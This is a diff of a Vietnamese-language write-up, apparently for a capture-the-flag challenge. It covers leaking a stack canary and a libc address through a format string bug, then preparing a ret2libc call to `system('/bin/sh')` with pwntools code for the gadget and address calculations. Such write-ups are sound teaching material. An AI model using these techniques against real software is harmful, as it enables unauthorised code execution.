@@ -217,6 +217,7 @@ Vậy, `%19$lx` sẽ leak được địa chỉ của canary tại runtime.
 #### Tìm địa chỉ trả về
 Sau khi có được giá trị của canary tại runtime để đảm bảo bypass được stack smashing protection, ta cần tính địa của hàm mà ta muốn trả về. Ban đầu, mình nghĩ là sẽ return về hàm `win`, tuy nhiên để gọi được `system` trong hàm `win` thì chuỗi `name` phải bằng `Nghi Hoang Khoa dep trai`. Mà `name` nằm trên stack và stack sẽ thường xuyên thay đôi khi chương trình đang chạy nên việc tìm được địa chỉ của `name` khá khó khăn. Vì vậy, mình thử hướng khác là **ret2libc**.
 
+#### `ret2libc`
 Đầu tiên, khi đặt break point ngay tại câu lệnh `ret` của hàm `vuln`, ta thấy được rằng câu lệnh tại `__libc_start_main+234` nằm ở `rsp + 0x10`, tương đương `rbp + 0x18` (`rbp` của hàm `vuln`. Mà canary nằm tại `rbp - 0x8` là đối số thứ 19 của foramt string, nên `__libc_start_main+234` nằm tại `rbp + 0x18` sẽ là đối số thứ 23 của format string. Vậy `%19$lx.%23$lx` sẽ giúp ta leak được canary và địa chỉ của câu lệnh tại `__libc_start_main+234`.  
 
 ![image](https://user-images.githubusercontent.com/44528004/146052827-f2f54fe4-4940-4355-827e-b7289e665d48.png)
@@ -235,4 +236,31 @@ from pwn import *
 
 e_libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
 print(e_libc.symbols['__libc_start_main'])
+```
+
+Sau khi có được relative address của `__libc_start_main`, ta có thể lấy địa chỉ runtime của `__libc_start_main` và trừ cho relative address, ta sẽ có được địa chỉ nền runtime của `libc`.  
+
+#### Gọi `system`
+Với địa chỉ nền runtime của `libc`, ta có thể tính được runtime address của nhiều thứ thông qua cách tìm relative address và cộng với địa chỉ nền runtime của `libc`. Ở đây, ta sẽ tìm cách gọi `system`. Và để gọi được `system`, ta cần setup cho `rdi` trỏ tới `/bin/sh`. Vậy ta cần:  
+- Địa chỉ runtime của `system`.
+- Địa chỉ runtime của `/bin/sh`.
+- ROP gadget `pop rdi; ret`.  
+
+Để làm được các việc trên, ta có thể tìm relative address của `system` trên `libc`; tìm relative address của câu lệnh `pop rdi; ret` trên `libc`; và relative address của chuỗi `/bin/sh` trên `libc`. Sau khi tìm được các relative address trên, ta chỉ cần cộng địa chỉ nền runtime của `libc` vào từng relative address là ta có được địa chỉ runtime của chúng.  
+
+Code exploit:
+```python
+e_libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
+libc_start_main_offset = e_libc.symbols['__libc_start_main']
+libc_base_addr = main_return_addr - 234 - libc_start_main_offset 
+
+bin_sh_addr_offset = list(e_libc.search(b'/bin/sh'))[0]
+bin_sh_runtime_addr = libc_base_addr + bin_sh_addr_offset
+
+rop = ROP(e_libc)
+pop_rdi_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rdi_runtime_addr = libc_base_addr + pop_rdi_offset
+
+system_offset = e_libc.symbols['system']
+system_runtime_addr = libc_base_addr + system_offset
 ```
